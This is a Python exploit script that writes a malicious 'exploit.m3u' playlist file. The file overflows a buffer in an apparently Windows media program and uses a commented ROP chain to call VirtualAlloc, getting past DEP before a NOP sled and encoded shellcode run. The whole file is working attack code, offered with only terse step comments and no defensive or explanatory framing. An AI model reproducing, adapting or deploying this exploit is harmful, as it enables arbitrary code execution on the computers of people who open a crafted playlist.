from struct import pack

prefix = b"http://"

va = pack("<L", (0x45454545)) # VirutalAlloc Address
va += pack("<L", (0x46464646)) # Shellcode Return Address
va += pack("<L", (0x47474747)) # lpAddress - Shellcode Address
va += pack("<L", (0x48484848)) # dwSize
va += pack("<L", (0x49494949)) # # flAllocationType
va += pack("<L", (0x51515151)) # flProtect

junk = b"A" * (17417 - len(va))

nops = b'\x90' * 100

shellcode =  b""
shellcode += b"\xb8\xa0\x70\x9c\x34\xda\xca\xd9\x74\x24\xf4"
shellcode += b"\x5a\x33\xc9\xb1\x31\x31\x42\x13\x03\x42\x13"
shellcode += b"\x83\xea\x5c\x92\x69\xc8\x74\xd1\x92\x31\x84"
shellcode += b"\xb6\x1b\xd4\xb5\xf6\x78\x9c\xe5\xc6\x0b\xf0"
shellcode += b"\x09\xac\x5e\xe1\x9a\xc0\x76\x06\x2b\x6e\xa1"
shellcode += b"\x29\xac\xc3\x91\x28\x2e\x1e\xc6\x8a\x0f\xd1"
shellcode += b"\x1b\xca\x48\x0c\xd1\x9e\x01\x5a\x44\x0f\x26"
shellcode += b"\x16\x55\xa4\x74\xb6\xdd\x59\xcc\xb9\xcc\xcf"
shellcode += b"\x47\xe0\xce\xee\x84\x98\x46\xe9\xc9\xa5\x11"
shellcode += b"\x82\x39\x51\xa0\x42\x70\x9a\x0f\xab\xbd\x69"
shellcode += b"\x51\xeb\x79\x92\x24\x05\x7a\x2f\x3f\xd2\x01"
shellcode += b"\xeb\xca\xc1\xa1\x78\x6c\x2e\x50\xac\xeb\xa5"
shellcode += b"\x5e\x19\x7f\xe1\x42\x9c\xac\x99\x7e\x15\x53"
shellcode += b"\x4e\xf7\x6d\x70\x4a\x5c\x35\x19\xcb\x38\x98"
shellcode += b"\x26\x0b\xe3\x45\x83\x47\x09\x91\xbe\x05\x47"
shellcode += b"\x64\x4c\x30\x25\x66\x4e\x3b\x19\x0f\x7f\xb0"
shellcode += b"\xf6\x48\x80\x13\xb3\xb7\x62\xb6\xc9\x5f\x3b"
shellcode += b"\x53\x70\x02\xbc\x89\xb6\x3b\x3f\x38\x46\xb8"
shellcode += b"\x5f\x49\x43\x84\xe7\xa1\x39\x95\x8d\xc5\xee"
shellcode += b"\x96\x87\xa5\x71\x05\x4b\x04\x14\xad\xee\x58"


rop = b""
'''Step 1'''
# Push ESP to ESI
rop += pack("<L", 0x10032e94) #push esp ; and al, 0x10 ; pop esi ; mov  [edx], ecx ; ret ;
rop += pack("<L", 0x88888888) # filler
# Obtain 0x45454545 palceholder Location to ESI
rop += pack("<L", 0x10039897) #pop ecx ; ret ;
rop += pack("<L", 0xffffffe0)# ffffffdc = -0x20
rop += pack("<L", 0x1003b9e0) #mov eax, esi ; pop esi ; ret ;
rop += pack("<L", 0x88888888) # filler
rop += pack("<L", 0x1001465e) #add eax, ecx ; ret ;
rop += pack("<L", 0x10040694) #push eax ; pop esi ; pop ebp ; mov eax,  [ecx+eax+0x02] ; pop ebx ; ret ;
rop += pack("<L", 0x88888888) # filler
rop += pack("<L", 0x88888888) # filler
# Obtain Virtual Aloc Location
rop += pack("<L", 0x1002a779) # pop eax ; ret ;
rop += pack("<L", 0x1004F060) # VirtualAlloc	KERNEL32
rop += pack("<L", 0x1004d304) # mov eax,  [eax] ; ret ;
# Put VirtualAloc location in 0x45454545 placeholder
rop += pack("<L", 0x10049875) # mov  [esi], eax ; pop esi ; ret ; 
rop += pack("<L", 0x88888888) # filler
'''Step 1'''


'''step 2'''
# Push ESP to ESI
rop += pack("<L", 0x10032e94) #push esp ; and al, 0x10 ; pop esi ; mov  [edx], ecx ; ret ;
# Obtain 0x46464646 palceholder Location to ESI
rop += pack("<L", 0x10039897) #pop ecx ; ret ;
rop += pack("<L", 0xffffffac)# ffffffdc = -0x54
rop += pack("<L", 0x1003b9e0) #mov eax, esi ; pop esi ; ret ;
rop += pack("<L", 0x88888888) # filler
rop += pack("<L", 0x1001465e) #add eax, ecx ; ret ;
rop += pack("<L", 0x10040694) #push eax ; pop esi ; pop ebp ; mov eax,  [ecx+eax+0x02] ; pop ebx ; ret ;
rop += pack("<L", 0x88888888) # filler
rop += pack("<L", 0x88888888) # filler
# Obtain shellcode location
rop += pack("<L", 0x100122bb) # push esi ; add al, 0x5E ; pop ebx ; ret
rop += pack("<L", 0x1003f6e2) # mov eax, ebx ; pop ebp ; pop ebx ; ret ;
rop += pack("<L", 0x88888888) # filler
rop += pack("<L", 0x88888888) # filler
rop += pack("<L", 0x100398e7) # pop ecx ; ret ;
rop += pack("<L", 0xfffffdfc) # fffffdfc = -0x204
rop += pack("<L", 0x1002c99a) # sub eax, ecx ; ret ;
# Put shellcode location in ox46464646 placeholder
rop += pack("<L", 0x10049875) # mov  [esi], eax ; pop esi ; ret ; 
rop += pack("<L", 0x88888888) # filler
'''step 2'''


'''step 3'''
# Push ESP to ESI
rop += pack("<L", 0x10032e94) #push esp ; and al, 0x10 ; pop esi ; mov  [edx], ecx ; ret ;
# Obtain 0x47474747 palceholder Location to ESI
rop += pack("<L", 0x10039897) # pop ecx ; ret ;
rop += pack("<L", 0xffffff68)# ffffff68 = -0x98
rop += pack("<L", 0x1003b9e0) # mov eax, esi ; pop esi ; ret ;
rop += pack("<L", 0x88888888) # filler
rop += pack("<L", 0x1001465e) # add eax, ecx ; ret ;
rop += pack("<L", 0x10040694) #push eax ; pop esi ; pop ebp ; mov eax,  [ecx+eax+0x02] ; pop ebx ; ret ;
rop += pack("<L", 0x88888888) # filler
rop += pack("<L", 0x88888888) # filler
# Obtain shellcode location
rop += pack("<L", 0x100122bb) # push esi ; add al, 0x5E ; pop ebx ; ret
rop += pack("<L", 0x1003f6e2) # mov eax, ebx ; pop ebp ; pop ebx ; ret ;
rop += pack("<L", 0x88888888) # filler
rop += pack("<L", 0x88888888) # filler
rop += pack("<L", 0x100398e7) # pop ecx ; ret ;
rop += pack("<L", 0xfffffdfc) # fffffdfc = -0x204
rop += pack("<L", 0x1002c99a) # sub eax, ecx ; ret ;
# Put shellcode location in 0x47474747 placeholder
rop += pack("<L", 0x10049875) # mov  [esi], eax ; pop esi ; ret ; 
rop += pack("<L", 0x88888888) # filler
'''step 3'''


'''step 4'''
# Push ESP to ESI
rop += pack("<L", 0x10032e94) #push esp ; and al, 0x10 ; pop esi ; mov  [edx], ecx ; ret ;
# Obtain 0x48484848 palceholder Location to ESI
rop += pack("<L", 0x10039897) #pop ecx ; ret ;
rop += pack("<L", 0xffffff24)# ffffff24 = -0xDC
rop += pack("<L", 0x1003b9e0) # mov eax, esi ; pop esi ; ret ;
rop += pack("<L", 0x88888888) # filler
rop += pack("<L", 0x1001465e) # add eax, ecx ; ret ;
rop += pack("<L", 0x10040694) # push eax ; pop esi ; pop ebp ; mov eax,  [ecx+eax+0x02] ; pop ebx ; ret ;
rop += pack("<L", 0x88888888) # filler
rop += pack("<L", 0x88888888) # filler
# Put 1 in dwSize
rop += pack("<L", 0x1002a779) # pop eax ; ret ;
rop += pack("<L", 0xffffffff) # ffffffff = -1
rop += pack("<L", 0x100170c5) # inc eax ; ret ; 
rop += pack("<L", 0x100170c5) # inc eax ; ret ; 
# Put shellcode location in 0x48484848 placeholder
rop += pack("<L", 0x10049875) # mov  [esi], eax ; pop esi ; ret ; 
rop += pack("<L", 0x88888888) # filler
'''step 4'''


'''step 5'''
# Push ESP to ESI
rop += pack("<L", 0x10032e94) #push esp ; and al, 0x10 ; pop esi ; mov  [edx], ecx ; ret ;
# Obtain 0x48484848 palceholder Location to ESI
rop += pack("<L", 0x10039897) # pop ecx ; ret ;
rop += pack("<L", 0xfffffeec) # fffffeec = -0x114
rop += pack("<L", 0x1003b9e0) # mov eax, esi ; pop esi ; ret ;
rop += pack("<L", 0x88888888) # filler
rop += pack("<L", 0x1001465e) # add eax, ecx ; ret ;
rop += pack("<L", 0x10040694) # push eax ; pop esi ; pop ebp ; mov eax,  [ecx+eax+0x02] ; pop ebx ; ret ;
rop += pack("<L", 0x88888888) # filler
rop += pack("<L", 0x88888888) # filler
# Put 1000 in flAllocationType
rop += pack("<L", 0x1002a779) # pop eax ; ret ;
rop += pack("<L", 0x88888888) # 
rop += pack("<L", 0x100398e7) # pop ecx ; ret ;
rop += pack("<L", 0x77778778) # 
rop += pack("<L", 0x1001465e) # add eax, ecx ; ret ;
# Put shellcode location in 0x48484848 placeholder
rop += pack("<L", 0x10049875) # mov  [esi], eax ; pop esi ; ret ; 
rop += pack("<L", 0x88888888) # filler
'''step 5'''


'''step 6'''
# Push ESP to ESI
rop += pack("<L", 0x10032e94) #push esp ; and al, 0x10 ; pop esi ; mov  [edx], ecx ; ret ;
# Obtain 0x51515151 palceholder Location to ESI
rop += pack("<L", 0x10039897) # pop ecx ; ret ;
rop += pack("<L", 0xfffffeb0) # fffffeb0 = -0x150
rop += pack("<L", 0x1003b9e0) # mov eax, esi ; pop esi ; ret ;
rop += pack("<L", 0x88888888) # filler
rop += pack("<L", 0x1001465e) # add eax, ecx ; ret ;
rop += pack("<L", 0x10040694) # push eax ; pop esi ; pop ebp ; mov eax,  [ecx+eax+0x02] ; pop ebx ; ret ;
rop += pack("<L", 0x88888888) # filler
rop += pack("<L", 0x88888888) # filler
# Put 0x40 in flProtect
rop += pack("<L", 0x1002a779) # pop eax ; ret ;
rop += pack("<L", 0x88888888) # 
rop += pack("<L", 0x100398e7) # pop ecx ; ret ;
rop += pack("<L", 0x777777b8) # 
rop += pack("<L", 0x1001465e) # add eax, ecx ; ret ;
# Put shellcode location in 0x48484848 placeholder
rop += pack("<L", 0x10049875) # mov  [esi], eax ; pop esi ; ret ; 
rop += pack("<L", 0x88888888) # filler
'''step 6'''


'''step 7'''
# Set ESP to 0x45454545 placeholder (VirtualAlloc)
rop += pack("<L", 0x10032e94) #push esp ; and al, 0x10 ; pop esi ; mov  [edx], ecx ; ret ;
# Obtain 0x51515151 palceholder Location to ESI
rop += pack("<L", 0x10039897) # pop ecx ; ret ;
rop += pack("<L", 0xfffffe58) # fffffe58 = -0x1a8
rop += pack("<L", 0x1003b9e0) # mov eax, esi ; pop esi ; ret ;
rop += pack("<L", 0x88888888) # filler
rop += pack("<L", 0x1001465e) # add eax, ecx ; ret ;
rop += pack("<L", 0x100406ee) # push eax ; pop ebp ; pop ebx ; mov eax,  [eax+ecx+0x02] ; ret ; 
rop += pack("<L", 0x88888888) # filler
rop += pack("<L", 0x1004c5c6) # mov esp, ebp ; pop ebp ; ret ;
rop += pack("<L", 0x88888888) # filler
'''step 7'''

payload = prefix + junk + va + rop + nops + shellcode

with open("exploit.m3u", "wb") as f:
    f.write(payload)
